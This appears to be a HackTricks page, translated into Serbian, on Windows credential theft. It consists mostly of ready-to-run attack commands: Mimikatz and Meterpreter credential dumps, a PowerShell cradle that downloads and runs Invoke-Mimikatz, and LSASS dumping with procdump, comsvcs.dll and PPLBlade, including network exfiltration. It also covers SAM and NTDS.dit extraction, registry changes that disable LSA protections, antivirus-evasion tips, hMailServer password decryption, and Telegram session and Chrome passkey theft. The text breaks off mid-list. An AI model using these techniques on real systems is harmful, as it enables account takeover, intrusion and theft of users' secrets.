# Krađa Windows pristupnih podataka

{{#include ../../banners/hacktricks-training.md}}

## Pristupni podaci Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Pronađite i druge stvari koje Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Saznajte više o nekim mogućim merama zaštite akreditiva ovde.**](credentials-protections.md) **Ove mere zaštite mogu sprečiti Mimikatz da izvuče neke akreditive.**

## Akreditivi u Meterpreter-u

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da biste **pretražili lozinke i hash-eve** na žrtvinoj mašini.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Zaobilaženje AV-a

### Procdump + Mimikatz

Pošto **Procdump kompanije** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**predstavlja legitiman Microsoft alat**, Defender ga ne detektuje.\
Ovaj alat možete da koristite za **dump procesa lsass**, **preuzimanje dump-a** i **lokalno izdvajanje** **akreditiva** iz dump-a.

Možete da koristite i [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ovaj proces se obavlja automatski pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** programi mogu da **detektuju** upotrebu **procdump.exe za pravljenje dumpa lsass.exe** kao **zlonamernu**, jer **detektuju** nizove **„procdump.exe“ i „lsass.exe“**. Zato je **diskretnije** proslediti **PID** procesa lsass.exe kao **argument** za procdump, **umesto** imena lsass.exe.

### Pravljenje dumpa lsass pomoću **comsvcs.dll**

DLL pod nazivom **comsvcs.dll**, koji se nalazi u `C:\Windows\System32`, odgovoran je za **pravljenje dumpa memorije procesa** u slučaju pada sistema. Ovaj DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, koja je osmišljena za pozivanje pomoću `rundll32.exe`.\
Prva dva argumenta nisu bitna, ali je treći podeljen na tri komponente. Prva komponenta je PID procesa čiji dump treba napraviti, druga je putanja do dump datoteke, a treća je isključivo reč **full**. Druge opcije ne postoje.\
Nakon obrade ove tri komponente, DLL pravi dump datoteku i upisuje memoriju navedenog procesa u tu datoteku.\
**comsvcs.dll** se može koristiti za pravljenje dumpa procesa lsass, čime se uklanja potreba za otpremanjem i pokretanjem procdump-a. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Za izvršavanje se koristi sledeća komanda:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumpovanje lsass-a pomoću Task Manager-a**

1. Kliknite desnim tasterom miša na traku zadataka i izaberite Task Manager
2. Kliknite na More details
3. Na kartici Processes potražite proces „Local Security Authority Process“
4. Kliknite desnim tasterom miša na proces „Local Security Authority Process“ i izaberite „Create dump file“.

### Dumpovanje lsass-a pomoću procdump-a

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je binarna datoteka koju je potpisao Microsoft i koja je deo paketa [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Već postojeći dump pada celog sistema ili njegova kompresovana kopija u dostupnoj korisničkoj fascikli mogu zadržati podatke za autentifikaciju za analizu van mreže. Nazivi datoteka kao što su `MEMORY.DMP` i `MEMORY.7z` služe samo kao tragovi za proveru: utvrdite poreklo i pristup, i ne pretpostavljajte da sadrže upotrebljive ili aktuelne podatke za autentifikaciju.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumpovanje lsass-a pomoću PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpovanje zaštićenih procesa koji podržava obfuskaciju memory dump-a i njegovo prenošenje na udaljene radne stanice bez zapisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfuskacija memory dump datoteka radi izbegavanja mehanizama Defender detekcije zasnovanih na potpisima
3. Otpremanje memory dump-a pomoću RAW i SMB metoda, bez zapisivanja na disk (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-based LSASS dumping bez MiniDumpWriteDump

Ink Dragon isporučuje dumper u tri faze pod nazivom **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, pa se EDR hook-ovi na tom API-ju nikada ne aktiviraju:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – traži u `fdp.dll` placeholder sastavljen od 32 mala slova `d`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva izmenjeni DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Time se **LSASS** primorava da učita zlonamerni DLL kao novi Security Support Provider (SSP).
2. **Stage 2 unutar LSASS-a** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, primenjuje XOR na svaki bajt sa `0x20` i mapira dekodirani blob u memoriju pre nego što prosledi izvršavanje.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls**, razrešene iz hash-ovanih API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Namenski export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje komprimovani LSASS dump u datoteku i zatvara handle kako bi exfiltration mogla da se obavi kasnije.

Napomene za operatera:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 menja hard-kodirani placeholder apsolutnom putanjom do `rtu.txt`, pa njihovo razdvajanje prekida chain.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete unapred postaviti kako bi LSASS ponovo učitavao SSP pri svakom pokretanju.
* Datoteke `%TEMP%\*.ddt` su komprimovani dump-ovi. Dekompresujte ih lokalno, a zatim ih prosledite alatima Mimikatz/Volatility radi izvlačenja akreditiva.
* Za pokretanje `lals.exe` potrebna su admin/SeTcb prava kako bi `AddSecurityPackageA` uspeo; čim se poziv završi, LSASS neprimetno učitava lažni SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili obrišite stavku registra i restartujte LSASS (ponovnim pokretanjem sistema), ili ga ostavite radi dugoročne perzistencije.

## CrackMapExec

### Dump SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Ispisivanje NTDS.dit sa ciljnog DC-a

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump istorije lozinki iz NTDS.dit fajla sa ciljnog DC-a

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Prikaži atribut pwdLastSet za svaki nalog u NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Krađa SAM i SYSTEM

Ove datoteke bi trebalo da budu **locirane** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih samo kopirati na uobičajen način** jer su zaštićene.

### Iz Registry-ja

Najlakši način da ukradete te datoteke jeste da pribavite njihovu kopiju iz Registry-ja:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Preuzmite** te datoteke na svoju Kali mašinu i **izvucite hash vrednosti** pomoću:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Pomoću ove usluge možete da kopirate zaštićene datoteke. Morate biti Administrator.

#### Korišćenje vssadmin

Binarna datoteka vssadmin dostupna je samo u verzijama Windows Servera.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ali isto možete da uradite i iz **Powershell-a**. Ovo je primer **kako da kopirate SAM datoteku** (korišćeni disk je „C:“, a datoteka se čuva u C:\users\Public), ali ovo možete da koristite za kopiranje bilo koje zaštićene datoteke:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kôd iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na kraju, možete koristiti i [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju datoteka SAM, SYSTEM i ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Akreditivi za Active Directory - NTDS.dit**

Datoteka **NTDS.dit** poznata je kao srce sistema **Active Directory** i sadrži ključne podatke o korisničkim objektima, grupama i njihovom članstvu. U njoj se čuvaju **password hashes** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na putanji **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri primarne tabele:

- **Data Table**: Ova tabela služi za čuvanje detalja o objektima kao što su korisnici i grupe.
- **Link Table**: Beleži odnose, kao što je članstvo u grupama.
- **SD Table**: Ovde se čuvaju **security descriptors** za svaki objekat, čime se obezbeđuju bezbednost i kontrola pristupa za sačuvane objekte.

Istraživanje sloja baze podataka koje je sproveo Christoffer Andersson detaljnije dokumentuje ove tabele i njihovo ponašanje u različitim verzijama.<sup>[[8]](#references)</sup>

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom, a koristi je i _lsass.exe_. Zatim se **deo** datoteke **NTDS.dit** može nalaziti u memoriji procesa **`lsass`** (verovatno možete pronaći najskorije pristupljene podatke zbog poboljšanja performansi korišćenjem **keša**).

#### Dešifrovanje hash vrednosti u datoteci NTDS.dit

Hash vrednost se šifruje tri puta:

1. Dešifrujte Password Encryption Key (**PEK**) pomoću **BOOTKEY** i **RC4**.
2. Dešifrujte **hash** pomoću **PEK** i **RC4**.
3. Dešifrujte **hash** pomoću **DES**.

**PEK** ima **istu vrednost na svakom kontroleru domena**, ali je **šifrovan** u datoteci **NTDS.dit** pomoću kontroleru domena specifičnog **BOOTKEY** ključa iz njegovog **SYSTEM** hive-a. Zato su za izdvajanje akreditiva potrebni i **NTDS.dit** i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kopiranje datoteke NTDS.dit pomoću Ntdsutil

Dostupno od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Takođe možete da upotrebite trik sa [**volume shadow copy**](#stealing-sam-and-system) da biste kopirali datoteku **ntds.dit**. Imajte na umu da će vam biti potrebna i kopija datoteke **SYSTEM** (opet, možete da primenite trik [**da je izvezete iz registry-ja ili upotrebite volume shadow copy**](#stealing-sam-and-system)).

### **Izdvajanje hash-eva iz NTDS.dit**

Kada **nabavite** datoteke **NTDS.dit** i **SYSTEM**, možete da upotrebite alate kao što je _secretsdump.py_ da biste **izdvojili hash-eve**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Možete ih i **automatski izdvojiti** pomoću važećeg korisnika administratora domena:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Za **velike NTDS.dit datoteke** preporučuje se izdvajanje pomoću alata [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit datoteke u SQLite bazu podataka**

NTDS objekte moguće je izdvojiti u SQLite bazu podataka pomoću alata [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Izdvajaju se ne samo tajne već i čitavi objekti i njihovi atributi, radi daljeg izdvajanja informacija kada je sirova NTDS.dit datoteka već pribavljena.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive `SYSTEM` je opcionalan, ali omogućava dešifrovanje secrets (NT i LM hash-eva, dodatnih akreditiva kao što su lozinke u čistom tekstu, Kerberos ili trust ključevi, kao i istorije NT i LM lozinki). Između ostalih informacija, izdvajaju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hash-evima, UAC zastavice, vremenske oznake poslednje prijave i promene lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstva, pouzdani domeni sa tipovima, smerom i atributima trust-ova...

## Lazagne

Preuzmite binarnu datoteku [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete je koristiti za izdvajanje akreditiva iz više softverskih programa.

```
lazagne.exe all
```

## Ostali alati za izvlačenje akreditiva iz SAM-a i LSASS-a

### Windows credentials Editor (WCE)

Ovaj alat može da se koristi za izvlačenje akreditiva iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvucite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Izvucite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Preuzmite ga sa: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite** da biste izdvojili lozinke.

## Prikupljanje podataka iz neaktivnih RDP sesija i slabljenje bezbednosnih kontrola

FinalDraft RAT grupe Ink Dragon sadrži tasker `DumpRDPHistory`, čije su tehnike korisne svakom red-teameru:<sup>[[3]](#references)</sup>

### Prikupljanje telemetrije u stilu DumpRDPHistory

* **Odredišta odlaznih RDP veza** – analizirajte svaki korisnički hive na putanji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki potključ čuva ime servera, `UsernameHint` i vremensku oznaku poslednje izmene. FinalDraft-ovu logiku možete da reprodukujete pomoću PowerShell-a:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Dokazi o dolaznim RDP vezama** – pretražite dnevnik `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za ID-jeve događaja **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao mašinu:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Kada saznate koji Domain Admin se redovno povezuje, dump-ujte LSASS (pomoću LalsDumper/Mimikatz) dok je njegova **prekinuta** sesija i dalje aktivna. CredSSP + NTLM fallback ostavljaju njegov verifier i tokene u LSASS-u, koji se zatim mogu ponovo upotrebiti preko SMB/WinRM-a za pribavljanje `NTDS.dit` ili uspostavljanje persistence-a na kontrolerima domena.

### Snižavanje nivoa zaštite registra koje cilja FinalDraft

Isti implant takođe menja nekoliko ključeva registra kako bi olakšao krađu akreditiva:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Podešavanje `DisableRestrictedAdmin=1` primorava na ponovno korišćenje punih akreditiva/ulaznica tokom RDP sesije, omogućavajući pivotiranje u stilu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, pa lokalni administratori preko mreže dobijaju neograničene tokene.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC na mreži, dajući napadačima još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, čime pristup memoriji postaje trivijalan za alate za dump kao što je LalsDumper.

## Akreditivi iz hMailServer konfiguracije (nakon kompromitovanja)

Proverite tačne konfiguracione datoteke `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` i `C:\ProgramData\hMailServer\hMailServer.ini`, u skladu sa rasporedom instalacije. Čitljiva vrednost koja nije prazna u `[Security] AdministratorPassword=` predstavlja hash administratorske lozinke za hMailServer; ona nije dokaz da je to lozinka Windows Administrator naloga. Ako se taj akreditiv otkrije, za pivotiranje na bilo koji Windows nalog potrebno je nezavisno potvrditi ponovno korišćenje lozinke i prava za prijavljivanje.

Za instalacije koje koriste SQL CE bazu podataka, zasebna vrednost `[Database] Password=` u INI datoteci štiti bazu podataka. U starijim instalacijama ova vrednost je šifrovana Blowfish algoritmom pomoću statičkog ključa `THIS_KEY_IS_NOT_SECRET` i zamene endian redosleda 4-bajtnih reči. Koristite heksadecimalni niz iz INI datoteke uz ovaj Python isečak:<sup>[[2]](#references)</sup>

Najpre potvrdite da trenutni nalog može da čita **i** INI datoteku **i** odgovarajuću SQL CE `.sdf` bazu podataka. INI lozinka štiti bazu podataka; odvojena je od hash-eva naloga poštanskih sandučića koji su u njoj sačuvani. Pregledajte ili nadogradite **kopiju** baze podataka koja je u upotrebi; nikada ne menjajte aktivnu datoteku.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Uz lozinku u otvorenom tekstu, kopirajte SQL CE bazu podataka da biste izbegli zaključavanje datoteke, učitajte 32-bitni provider i izvršite nadogradnju ako je potrebno pre upita za hash vrednosti:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Kolona `accountpassword` koristi hMailServer format hash-a (hashcat režim `1421`). Probijena lozinka poštanskog sandučeta omogućava pivot ka Windows korisniku samo ako tu lozinku koristi i lokalni/domenski nalog i ako taj nalog ima potrebna prava za udaljeno prijavljivanje.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Neki alati hvataju **lozinke za prijavljivanje u plaintext obliku** tako što presreću LSA povratni poziv za prijavljivanje `LsaApLogonUserEx2`. Ideja je da se zakači hook na povratni poziv autentifikacionog paketa ili da se on obmota, kako bi se akreditivi uhvatili **tokom prijavljivanja** (pre heširanja), a zatim zapisali na disk ili vratili operateru. To se obično implementira pomoću pomoćnog alata koji se ubacuje u LSA ili se u njega registruje, a zatim beleži svaki uspešan interaktivni/mrežni događaj prijavljivanja, uključujući korisničko ime, domen i lozinku.<sup>[[1]](#references)</sup>

Operativne napomene:
- Potrebna su lokalna administratorska/SYSTEM prava za učitavanje pomoćnog alata u putanju autentifikacije.
- Uhvaćeni akreditivi se pojavljuju samo kada dođe do prijavljivanja (interaktivnog, RDP, uslužnog ili mrežnog, u zavisnosti od hook-a).

## Sačuvani akreditivi za povezivanje u SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva informacije o sačuvanim vezama u korisničkoj datoteci `sqlstudio.bin`. Namenski dumpers mogu da parsiraju datoteku i povrate sačuvane SQL akreditive. U shell-ovima koji vraćaju samo izlaz komande, datoteka se često eksfiltrira tako što se kodira kao Base64 i ispisuje na stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Na strani operatora, ponovo napravite datoteku i pokrenite dumper lokalno da biste povratili pristupne podatke:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Krađa sesije pregledača i kolačića putem Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Krađa Telegram Desktop `tdata` sesije

Telegram Desktop čuva stanje autorizacije i naloga u svom direktorijumu **`tdata`**. Kopirana sesija može da se učita pomoću kompatibilnih alata radi autentifikacije bez lozinke naloga, dokle god je ta autorizacija važeća; ako je omogućeno šifrovanje lokalnih podataka, stealeru je potrebna i pristupna šifra. Autentifikovana sesija zatim može da otkrije podatke o identitetu, metapodatke o razgovorima i članstvu, poruke i medije koje je moguće preuzeti.<sup>[[10]](#references)</sup>

### Otkrivanje i pribavljanje

Pretražite i instalirane i prenosive rasporede; nazivi paketa u Microsoft Store-u se razlikuju, pa izlistajte direktorijume paketa koji sadrže `TelegramMessenge` i pregledajte njihovo podstablo `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ako obična čitanja ne uspeju, a procesni token **već sadrži i omogućava** `SeBackupPrivilege`, pristup koji podržava backup pruža alternativu; on ne pribavlja privilegiju niti podiže nivo ovlašćenja procesa. `CreateFileW` sa `FILE_FLAG_BACKUP_SEMANTICS` može da zatraži semantiku backup/restore i zaobiđe bezbednosne provere datoteka kada su potrebne privilegije tokena prisutne, ali sama zastavica ne zaobilazi nekompatibilno deljenje datoteke.<sup>[[10]](#references)[[11]](#references)</sup>

Za datoteke koje su trenutno zaključane napravite/čitajte **Volume Shadow Copy**; za datoteke blokirane ACL-om, `robocopy /B` koristi backup režim i zaobilazi ACL-ove datoteka i direktorijuma.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant koji vodi računa o propusnom opsegu može prvo da pošalje samo inventar putanja do fajlova, primi identifikator snimka i putanje koje C2 već poseduje, a zatim otpremi samo fajlove koji nedostaju. Zato i mali inkrementalni prenosi nakon rekurzivnog popisivanja `tdata` mogu ukazivati na uspešnu krađu sesije.<sup>[[10]](#references)</sup>

### Detekcija i ograničavanje posledica

Povežite rekurzivni pristup direktorijumu `tdata` koji obavlja proces koji nije Telegram sa omogućavanjem privilegije `SeBackupPrivilege`, otvaranjem fajlova sa semantikom rezervne kopije, VSS aktivnošću ili podređenim procesom `robocopy.exe` koji koristi `/B`. Takođe tražite brzo popisivanje direktorijuma `%APPDATA%` i `%LOCALAPPDATA%\Packages`, nakon čega slede odlazne veze istog procesa. Nakon kompromitovanja, koristite **Settings → Devices** (ili **Privacy & Security → Active Sessions**) da biste prekinuli neprepoznate sesije; samo uključivanje verifikacije u dva koraka ne opoziva autorizaciju koja je već ukradena.<sup>[[10]](#references)[[13]](#references)</sup>

## Krađa passkeys / WebAuthn akreditiva iz Chrome-a na Windows-u

Ako se na Windows hostu koji koristi **Chrome + Google Password Manager sinhronizovane passkeys** ostvari izvršavanje koda kao **korisnik-žrtva**, passkeys postaju zanimljiva meta za post-exploitation, čak i **bez admin/SYSTEM** privilegija.<sup>[[4]](#references)</sup>

### Zanimljivi lokalni artefakti

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** čuva protobuf-enkodirane zapise **`WebauthnCredentialSpecifics`**. Proces koji se izvršava pod istim korisnikom može da enumeriše **RP ID**, **username**, **credential ID** i šifrovani materijal privatnog ključa za sinhronizovane passkey-je.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** čuva lokalno stanje registracije uređaja, kao što su **`wrapped_identity_private_key`** i umotana tajna koja se koristi za oporavak sinhronizovanih kredencijala.<sup>[[4]](#references)</sup>

Brza trijaža:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blobovi ključeva vezanih za TPM i dalje se mogu zloupotrebiti kao lokalni oracle za potpisivanje

Ako pregledač izveze identitetski ključ podržan TPM-om kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malware **ne mora** da izdvoji sirovi privatni ključ. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke koje kontroliše napadač:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

To znači da **vezivanje za hardver sprečava izvoz van uređaja, ali ne i korišćenje pod nalogom istog korisnika na kompromitovanom endpoint-u**.

### Praktični načini zloupotrebe

1. **Pass-ta-key / relay identiteta uređaja**<sup>[[4]](#references)</sup>
   - Izlistajte `WebauthnCredentialSpecifics` iz Chrome-ovog LevelDB-a.
   - Pokrenite prijavu pomoću passkey-a i pribavite svež WebAuthn izazov.
